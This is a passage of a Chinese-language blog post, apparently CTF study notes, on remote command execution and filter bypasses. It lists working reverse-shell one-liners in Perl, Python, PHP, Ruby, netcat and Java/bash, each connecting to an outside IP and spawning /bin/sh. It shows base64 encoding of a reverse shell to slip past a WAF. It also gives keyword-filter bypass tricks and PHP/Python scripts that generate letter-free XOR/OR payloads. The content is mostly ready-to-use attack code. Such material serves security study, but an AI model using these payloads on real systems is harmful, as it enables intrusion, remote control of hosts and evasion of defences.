Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><p> 解释如下</p> <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">perl -e <span class="hljs-string">&#x27;use Socket;</span><br><span class="hljs-string">$i=&quot;10.0.0.1&quot;;  # 设置目标主机的 IP 地址</span><br><span class="hljs-string">$p=1234;        # 设置目标主机的端口号</span><br><span class="hljs-string">socket(S, PF_INET, SOCK_STREAM, getprotobyname(&quot;tcp&quot;));  # 创建 TCP 套接字</span><br><span class="hljs-string">if(connect(S, sockaddr_in($p, inet_aton($i)))) &#123;  # 尝试连接到目标主机</span><br><span class="hljs-string">    open(STDIN, &quot;&gt;&amp;S&quot;);  # 将 STDIN 重定向到套接字 S</span><br><span class="hljs-string">    open(STDOUT, &quot;&gt;&amp;S&quot;);  # 将 STDOUT 重定向到套接字 S</span><br><span class="hljs-string">    open(STDERR, &quot;&gt;&amp;S&quot;);  # 将 STDERR 重定向到套接字 S</span><br><span class="hljs-string">    exec(&quot;/bin/sh -i&quot;);  # 执行一个交互式的 shell</span><br><span class="hljs-string">&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><p> ‍</p><p> python脚本</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pyhton">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;<br></code></pre></td></tr></table></figure><p> 解释如下</p><p> 在命令行中使用 <code>python -c</code>​ 时，你可以直接提供一行 Python 代码，并且 Python 解释器会立即执行它</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pyhton">import socket, subprocess, os  # 导入所需的模块：socket、subprocess、os<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 创建一个 TCP 套接字对象<br>s.connect((&quot;10.0.0.1&quot;, 1234))  # 连接到指定的 IP 地址和端口<br><br># 重定向套接字的文件描述符到标准输入、标准输出和标准错误输出<br>os.dup2(s.fileno(), 0)<br>os.dup2(s.fileno(), 1)<br>os.dup2(s.fileno(), 2)<br><br># 调用 /bin/sh -i 命令，启动一个交互式的 shell<br>p = subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;])<br></code></pre></td></tr></table></figure><p> ‍</p><p> ‍</p><p> php脚本</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure><p> 解释如下</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">php -r：这是 PHP 命令行的参数，指示 PHP 解释器执行后续的代码。<br><span class="hljs-string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);：这行代码使用 fsockopen 函数连接到指定的 IP 地址（&quot;10.0.0.1&quot;）和端口（1234），并将连接的套接字对象保存在 $sock 变量中。</span><br><span class="hljs-string">exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);：这行代码使用 exec 函数执行一个 shell 命令。/bin/sh -i 启动一个交互式的 shell。&lt;&amp;3 &gt;&amp;3 2&gt;&amp;3 部分是将文件描述符 3（即 $sock 的文件描述符）重定向到标准输入、标准输出和标准错误输出。</span><br></code></pre></td></tr></table></figure><p> ‍</p><p> ruby脚本</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ruby -rsocket -e<span class="hljs-string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></code></pre></td></tr></table></figure><p> 解释如下</p> <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">ruby -rsocket -e：这是 <span class="hljs-title class_">Ruby</span> 解释器的命令行参数，指示 <span class="hljs-title class_">Ruby</span> 解释器执行后续的代码。-rsocket 参数用于加载 socket 模块，以便在代码中使用套接字相关的功能。<br><span class="hljs-string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;：这行代码使用 TCPSocket.open 方法连接到指定的 IP 地址（&quot;10.0.0.1&quot;）和端口（1234），并返回一个套接字对象。.to_i 方法将套接字对象转换为整数，以获取其文件描述符（file descriptor）。</span><br><span class="hljs-string">exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)：这行代码使用 exec 方法执行一个 shell 命令。sprintf 函数用于将格式化字符串和参数合并成一个新的字符串。/bin/sh -i 启动一个交互式的 shell。&lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d 部分是将文件描述符 %d（即前面获取到的套接字的文件描述符）重定向到标准输入、标准输出和标准错误输出。</span><br></code></pre></td></tr></table></figure><p> ‍</p><p> nc -e &#x2F;bin&#x2F;sh 10.0.0.1 1234</p><p> rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;&#x2F;tmp&#x2F;f</p><p> ‍</p><p> java脚本</p><p> 受害者服务器执行这段代码前，必须保证服务器中有</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">r = Runtime.getRuntime()<br>p = r.exec([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])<br>p.waitFor()<br></code></pre></td></tr></table></figure><p> 解释如下</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">r = Runtime.getRuntime()  <span class="hljs-comment">// 获取 Runtime 对象</span><br>p = r.exec([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])  <span class="hljs-comment">// 执行命令并返回进程对象</span><br>p.waitFor()  <span class="hljs-comment">// 等待命令执行完成</span><br></code></pre></td></tr></table></figure><p> ‍</p><p> 如果有 waf 进行连接，可以把语句进行 base64 加密后，因为加密后的字符串没有触发拦截规则，再利用shell 命令再进行解码。</p><p> <code>bash -i &gt;&amp; /dev/tcp/192.168.0.103/8080 0&gt;&amp;1</code>​</p><p> base64 编码后 <code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTAzLzgwODAgMD4mMQ==</code>​</p><p> 受害者执行</p><p> <code>echo&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTMzLzgwODAgMD4mMQ==&quot;|base64 -d|bash</code>​</p></li></ol><p>‍</p><p>‍</p><h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p><a href="https://xz.aliyun.com/t/9360">https://xz.aliyun.com/t/9360</a></p><p>‍</p><p>‍</p><h2 id="无字母数字RCE"><a href="#无字母数字RCE" class="headerlink" title="无字母数字RCE"></a>无字母数字RCE</h2><p>p牛</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>总结</p><p><a href="https://xz.aliyun.com/t/8107?page=5&time__1311=eqfxBDuD973YqGIxGNDQuxBIYoVYt3qi74D#toc-18">https://xz.aliyun.com/t/8107?page=5&amp;time__1311=eqfxBDuD973YqGIxGNDQuxBIYoVYt3qi74D#toc-18</a></p><p>‍</p><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="关键词过滤-flag"><a href="#关键词过滤-flag" class="headerlink" title="关键词过滤(flag)"></a>关键词过滤(flag)</h2><p><a href="https://blog.csdn.net/weixin_46706771/article/details/119031475">RCE绕过之关键词绕过_绕过cat more等-CSDN博客</a></p><ol><li><p>通配符</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">flag=fl*<br>cat fl*<br>cat ?la*<br></code></pre></td></tr></table></figure></li><li><p>转义符号</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">ca\\t /fl\\ag<br>cat fl<span class="hljs-string">&#x27;&#x27;</span>ag<br>cat fl<span class="hljs-string">&quot;&quot;</span>ag<br></code></pre></td></tr></table></figure></li><li><p>使用空变量∗ 和 *和∗和@，x , x,x,{x}绕过</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">ca$*t fl$*ag<br>ca$@t fl$@ag<br>ca$<span class="hljs-number">5</span>t f$<span class="hljs-number">5</span>lag<br>ca$&#123;<span class="hljs-number">2</span>&#125;t f$&#123;<span class="hljs-number">2</span>&#125;lag<br></code></pre></td></tr></table></figure></li><li><p>拼接法</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a=fl;b=ag;cat$IFS$a<span class="hljs-variable">$b</span><br></code></pre></td></tr></table></figure></li><li><p>反引号绕过</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cat `ls`   <span class="hljs-comment">//在php中这个`反引号代表执行命令的意思</span><br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240825143240-6slxz6p.png" alt="image">​</p></li><li><p>编码绕过</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#x27;</span> | base64<br>cat `<span class="hljs-keyword">echo</span> ZmxhZwo= | base64 -d`<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240825143335-q5gh5k8.png" alt="image">​</p></li><li><p>组合绝活</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">touch <span class="hljs-string">&quot;ag&quot;</span><br>touch <span class="hljs-string">&quot;fl\\&quot;</span><br>touch <span class="hljs-string">&quot;t \\&quot;</span><br>touch <span class="hljs-string">&quot;ca\\&quot;</span><br>ls -t &gt;shell  -t是指以时间来展示文件<br>sh shell<br><span class="hljs-comment">#  \指的是换行</span><br><span class="hljs-comment">#  ls -t是将文本按时间排序输出</span><br><span class="hljs-comment">#  ls -t &gt;shell  将输出输入到shell文件中</span><br><span class="hljs-comment">#  sh将文本中的文字读取出来执行</span><br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240825143416-dyzdx6c.png" alt="image">​</p><p> <img src="/assets/image-20240825143449-3szw887.png" alt="image">​</p></li><li><p>异或无符号（过滤0-9a-zA-Z）</p><p> <img src="/assets/image-20240825143547-ph3b3yf.png" alt="image">​</p><p> 脚本</p><p> rce-xor.php</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;res.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>            <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>            <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><p> 执行后生成res.txt</p><p> 将生成的res.txt放到python脚本同一目录下</p><p> rce-xor.py</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>    s1 = <span class="hljs-string">&quot;&quot;</span><br>    s2 = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>        f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            t = f.readline()<br>            <span class="hljs-keyword">if</span> t == <span class="hljs-string">&quot;&quot;</span>:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>] == i:<br>                <span class="hljs-comment"># print(i)</span><br>                s1 += t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>                s2 += t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>                <span class="hljs-keyword">break</span><br>        f.close()<br>    output = <span class="hljs-string">&quot;(\&quot;&quot;</span> + s1 + <span class="hljs-string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="hljs-string">&quot;\&quot;)&quot;</span><br>    <span class="hljs-keyword">return</span> (output)<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    param = action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>)) + <span class="hljs-string">&quot;;&quot;</span><br>    <span class="hljs-built_in">print</span>(param)<br></code></pre></td></tr></table></figure><p> 运行python脚本</p><p> ​<img src="/assets/image-20240825144000-rv52t3k.png" alt="image">​</p><p> ​<img src="/assets/image-20240825144021-talgbku.png" alt="image">​</p><p> 还有同上原理的两个脚本</p><p> rce-xor-or.php</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;res_xor.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>            <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>            <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><p> 生成res_xor.txt</p><p> 脚本rce-xor-or.py</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>    s1 = <span class="hljs-string">&quot;&quot;</span><br>    s2 = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>        f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res_xor.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            t = f.readline()<br>            <span class="hljs-keyword">if</span> t == <span class="hljs-string">&quot;&quot;</span>:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>] == i:<br>                <span class="hljs-comment"># print(i)</span><br>                s1 += t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>                s2 += t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>                <span class="hljs-keyword">break</span><br>        f.close()<br>    output = <span class="hljs-string">&quot;(\&quot;&quot;</span> + s1 + <span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span> + s2 + <span class="hljs-string">&quot;\&quot;)&quot;</span><br>    <span class="hljs-keyword">return</span> (output)<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    param = action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>)) + <span class="hljs-string">&quot;;&quot;</span><br>    <span class="hljs-built_in">print</span>(param)<br></code></pre></td></tr></table></figure><p> ​<img src="/assets/image-20240825144328-402wo1s.png" alt="image">​</p></li></ol><p>‍</p><h2 id="过滤命令-如-tac-cat-等"><a href="#过滤命令-如-tac-cat-等" class="headerlink" title="过滤命令(如 tac cat 等)"></a>过滤命令(如 tac cat 等)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容<br>sh /flag <span class="hljs-number">2</span>&gt;%<span class="hljs-number">261</span> <span class="hljs-comment">//报错出文件内容</span><br>curl file:<span class="hljs-comment">///root/f/flag</span><br>strings 